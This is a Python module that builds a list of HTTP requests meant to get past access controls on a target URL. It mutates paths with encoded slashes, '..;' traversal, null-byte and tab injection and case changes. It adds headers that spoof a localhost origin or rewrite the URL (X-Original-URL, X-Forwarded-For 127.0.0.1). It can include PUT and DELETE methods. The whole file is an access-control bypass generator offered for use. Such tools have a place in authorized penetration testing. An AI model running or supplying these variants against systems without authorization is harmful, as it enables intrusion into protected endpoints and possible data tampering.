from __future__ import annotations

from dataclasses import dataclass
from typing import Dict, Iterable, List, Optional, Tuple
from urllib.parse import urlparse, urlunparse


@dataclass(frozen=True)
class BypassVariant:
    method: str
    url: str
    headers: Dict[str, str]
    description: str


def _with_path(url: str, new_path: str) -> str:
    parsed = urlparse(url)
    replaced = parsed._replace(path=new_path)
    return urlunparse(replaced)


def _append_query(url: str, query: str) -> str:
    parsed = urlparse(url)
    new_q = f"{parsed.query}&{query}" if parsed.query else query
    return urlunparse(parsed._replace(query=new_q))


def _path_variants(path: str) -> List[str]:
    candidates: List[str] = []
    candidates.append(path)
    for suffix in ["/", ".", "..;", ";/", "/.", "/..", "%2e/", "%2f", "?", "#"]:
        if not path.endswith(suffix):
            candidates.append((path + suffix).replace("//", "/"))
    encoded_slash = path.replace("/", "%2f")
    if encoded_slash != path:
        candidates.append(encoded_slash)
    double_slash = path.replace("/", "//")
    if double_slash != path:
        candidates.append(double_slash)
    mixed = path.replace("/", "/%2f")
    if mixed != path:
        candidates.append(mixed)
    for inject in ["%09", "%20", "%00"]:
        if not path.endswith("/"):
            candidates.append(path + inject + "/")
    if any(c.isalpha() for c in path):
        candidates.append(path.upper())
        candidates.append(path.lower())
    for prefix in ["/./", "/../", "/..;/", "/;%2f", "%2e%2e/%2f"]:
        if not path.startswith(prefix):
            candidates.append(prefix + path.lstrip("/"))
    seen = set()
    uniq: List[str] = []
    for p in candidates:
        if p not in seen:
            uniq.append(p)
            seen.add(p)
    return uniq


def _header_variants(base_headers: Optional[Dict[str, str]], original_path: str) -> List[Tuple[str, Dict[str, str]]]:
    base = {k.strip(): v for k, v in (base_headers or {}).items()}
    variants: List[Tuple[str, Dict[str, str]]] = []

    def add(name: str, h: Dict[str, str]) -> None:
        variants.append((name, h))

    add("baseline", dict(base))
    add("x-original-url", {**base, "X-Original-URL": original_path})
    add("x-rewrite-url", {**base, "X-Rewrite-URL": original_path})
    add("x-forwarded-slash", {**base, "X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "127.0.0.1"})
    add("x-custom-ip", {**base, "X-Client-IP": "127.0.0.1", "X-Real-IP": "127.0.0.1"})

    add("accept-star", {**base, "Accept": "*/*"})
    add("accept-json", {**base, "Accept": "application/json"})
    add("accept-lang-en", {**base, "Accept-Language": "en-US,en;q=0.9"})

    if "Host" in base:
        host = base["Host"]
        add("host-upper", {**base, "Host": host.upper()})
        add("host-lower", {**base, "Host": host.lower()})

    add("no-cache", {**base, "Cache-Control": "no-cache", "Pragma": "no-cache"})
    add("te-chunked", {**base, "TE": "trailers", "Transfer-Encoding": "chunked"})
    add("via-proxy", {**base, "Via": "1.1 example"})

    return variants


def _method_list(include_non_idempotent: bool) -> List[str]:
    methods = ["GET", "HEAD", "OPTIONS"]
    if include_non_idempotent:
        methods.extend(["POST", "PUT", "DELETE", "PATCH"])
    return methods


def generate_bypass_variants(
    url: str,
    *,
    base_headers: Optional[Dict[str, str]] = None,
    include_non_idempotent: bool = False,
    extra_query_payloads: Optional[Iterable[str]] = None,
) -> List[BypassVariant]:
    parsed = urlparse(url)
    original_path = parsed.path or "/"

    path_candidates = _path_variants(original_path)
    header_candidates = _header_variants(base_headers, original_path)
    methods = _method_list(include_non_idempotent)

    variants: List[BypassVariant] = []

    for method in methods:
        for path_variant in path_candidates:
            mutated_url = _with_path(url, path_variant)
            if extra_query_payloads:
                for q in extra_query_payloads:
                    mutated_url_with_q = _append_query(mutated_url, q)
                    for header_name, headers in header_candidates:
                        variants.append(
                            BypassVariant(
                                method=method,
                                url=mutated_url_with_q,
                                headers=headers,
                                description=f"{method} {path_variant} headers={header_name} q={q}",
                            )
                        )
            for header_name, headers in header_candidates:
                variants.append(
                    BypassVariant(
                        method=method,
                        url=mutated_url,
                        headers=headers,
                        description=f"{method} {path_variant} headers={header_name}",
                    )
                )

    seen_keys = set()
    unique: List[BypassVariant] = []
    for v in variants:
        key = (v.method, v.url, tuple(sorted(v.headers.items())))
        if key not in seen_keys:
            unique.append(v)
            seen_keys.add(key)

    return unique
